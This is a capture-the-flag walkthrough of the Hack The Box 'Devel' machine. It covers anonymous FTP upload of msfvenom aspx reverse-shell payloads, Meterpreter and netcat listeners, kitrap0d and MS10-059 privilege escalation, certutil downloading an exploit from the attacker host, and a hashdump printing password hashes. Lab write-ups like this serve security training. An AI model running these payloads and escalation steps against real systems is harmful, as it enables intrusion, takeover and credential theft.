# Walkthrough
```bash
root@kali:~/HTB/Devel# nmap -sV -sC -p- -oN nmap/initial 10.10.10.5
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-21 13:22 CET
Nmap scan report for 10.10.10.5
Host is up (0.11s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 208.83 seconds
```

The port 21 is open. Let's try to log in as Anonymous user.

```bash
root@kali:~/HTB/Devel# ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
```

Let's see which files we do have.

```bash
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
```

It feels that we have a default welcome page. We can try to upload something malicious to the ftp service.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/463cfb1e-014c-4466-9844-1ff2acfc35f2/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/463cfb1e-014c-4466-9844-1ff2acfc35f2/Untitled.png)

Welcome IIS7 page.

Let's create a payload with msfvenom.

```bash
root@kali:~/HTB/Devel# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx > reverse_shell.aspx
```

`-p` → Payload.

`-f` → File type.

`-LHOST` → Local host.

`-LPORT` → Local port.

We use a windows/meterpreter/reverse_tcp payload so we need to load up metasploit.

We can do this process manualy (not using metasploit) 

```bash
root@kali:~/HTB/Devel# msfconsole
```

We are going to use exploit/multi/handler for listening to the port 4444.

```bash
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf6 exploit(multi/handler) > set LHOST 10.10.14.5
LHOST => 10.10.14.5
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.5       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:4444 
```

Now that everything is set up, lets put the payload into the ftp service and let's execute it.

```bash
root@kali:~/HTB/Devel# ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put reverse_shell.aspx
local: reverse_shell.aspx remote: reverse_shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2906 bytes sent in 0.00 secs (36.9517 MB/s)
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
02-21-21  02:20PM                 2906 reverse_shell.aspx
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
```

Once the payload is uploaded, we execute it with this URL:

[http://10.10.10.5/reverse_shell.aspx](http://10.10.10.5/reverse_shell.aspx)

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 4 opened (10.10.14.5:4444 -> 10.10.10.5:49164) at 2021-02-21 14:03:38 +0100

meterpreter > getuid
Server username: IIS APPPOOL\Web

```

As we can see, we are logged as IIS APPPOOL. We are not authority system so we don't have privileges. Let's try to run a post module in metasploit called suggester to see if we are able to scalate privs.

```bash
meterpreter > bg
[*] Backgrounding session 4...
msf6 exploit(multi/handler) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester

Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester 
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > set session 4
session => 4
```

You can also run this command in meterpreter, the result will be the same:

```bash
meterpreter > run post/multi/recon/local_exploit_suggester
```

```bash
msf6 post(multi/recon/local_exploit_suggester) > exploit

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 37 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

As we can see we have many vulnerabilities to test. I'm going to try ms10_015_kitrap0d because it looks interesting.

We have a module in metasploit for that vulnerability let's use it.

```bash
msf6 post(multi/recon/local_exploit_suggester) > search ms10_015_kitrap0d

Matching Modules
================

   #  Name                                     Disclosure Date  Rank   Check  Description
   -  ----                                     ---------------  ----   -----  -----------
   0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D

Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/ms10_015_kitrap0d
msf6 exploit(windows/local/ms10_015_kitrap0d) > options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.5       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)

msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 4
session => 4
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Launching notepad to host the exploit...
[+] Process 652 launched.
[*] Reflectively injecting the exploit DLL into 652...
[*] Injecting exploit into 652 ...
[*] Exploit injected. Injecting payload into 652...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 5 opened (10.10.14.5:4444 -> 10.10.10.5:49165) at 2021-02-21 14:11:35 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

The exploit works and now we are AUTHORITY\SYSTEM, this means we have administrator privileges.

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a450f6000be7df50ee304d0a838d638f:::
babis:1000:aad3b435b51404eeaad3b435b51404ee:a1133ec0f7779e215acc8a36922acf57:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Now It's time to search for the flags, the user flag and the root flag.

```bash
meterpreter > shell
Process 3536 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of c:\Users\Administrator\Desktop

14/01/2021  11:42 ��    <DIR>          .
14/01/2021  11:42 ��    <DIR>          ..
18/03/2017  01:17 ��                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  22.281.924.608 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
e621a0b5041708797c4fc4728bc72b4b
```

```bash
c:\Users\babis\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of c:\Users\babis\Desktop

18/03/2017  01:14 ��    <DIR>          .
18/03/2017  01:14 ��    <DIR>          ..
18/03/2017  01:18 ��                32 user.txt.txt
               1 File(s)             32 bytes
               2 Dir(s)  22.281.924.608 bytes free

c:\Users\babis\Desktop>type user.txt.txt
type user.txt.txt
9ecdd6a3aedf24b41562fea70f4cb3e8
```

---

## Manual mode

Instead of creating a windows/meterpreter/reverse_tcp payload with msfconsole we are going to create a windows/shell_reverse_tcp payload.

```bash
root@kali:~/HTB/Devel# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=1234 -f aspx > manual.aspx
```

Now we are going to set the listener with netcat using the next command:

```bash
root@kali:~# nc -nvlp 1234
listening on [any] 1234 ...
```

We put the payload in the victim machine using the ftp service

```bash
root@kali:~/HTB/Devel# ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> lks
?Invalid command
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
02-21-21  02:20PM                 2906 reverse_shell.aspx
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> put manual.aspx
local: manual.aspx remote: manual.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2736 bytes sent in 0.00 secs (40.1424 MB/s)
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
02-21-21  09:29PM                 2736 manual.aspx
02-21-21  02:20PM                 2906 reverse_shell.aspx
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
```

We execute our payload in the attacking machine using the web browser:

[http://10.10.10.5/manual.aspx](http://10.10.10.5/manual.aspx)

And now we got a reverse shell

```bash
root@kali:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.5] 49173
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>
```

It's time to run suggester.py on my local machine so first of all go to [Resources](https://www.notion.so/Resources-6d3bc57c5c9449dd9192ee0bd52b0f72) and download windows suggester.py

Let's go to the reverse shell and get the system info

```bash
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          21/2/2021, 1:37:25 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.450 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.536 MB
Virtual Memory: In Use:    605 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::80e2:3e38:2f22:5286
                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e
```

Copy this information into a file so we can use it in suggester.

Once we have everything setup, let's run suggester.py

```bash
root@kali:/opt/Windows-Exploit-Suggester# ./windows-exploit-suggester.py --database 2021-02-21-mssb.xls --systeminfo /root/HTB/Devel/systeminfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 179 potential bulletins(s) with a database of 137 known exploits
[*] there are now 179 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 7 32-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

Now that we are here, we need to try to exploit one of these vulnerabilities. I'll try with MS10-059. The first thing you gonna do is to google MS10-059. I found this [github repo](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059) so let's see if it works.

 

From here, i'm going to start a python server so i will be able to download the file on the target machine

```bash
root@kali:~/HTB/Devel/Exploits# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

Let's get it from the target shell

```bash
c:\Windows\Temp>certutil -urlcache -f http://10.10.14.5/MS10-059.exe ms.exe
```

Now that we have the file, i will open another tab for running netcat on my local machine and let's execute the exploit

```bash
root@kali:~# nc -nvlp 55555
listening on [any] 55555 ...
```

```bash
c:\Windows\Temp>ms.exe 10.10.14.5 55555
```

Cross our fingers and...

```bash
root@kali:~# nc -nvlp 55555
listening on [any] 55555 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.5] 49177
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\Windows\Temp>whoami
whoami
nt authority\system

```

We are AUTHORITY\SYSTEM! I love Kernel exploits 🥰. Now we are able to look for the user and root flags as we saw before in the metasploit way.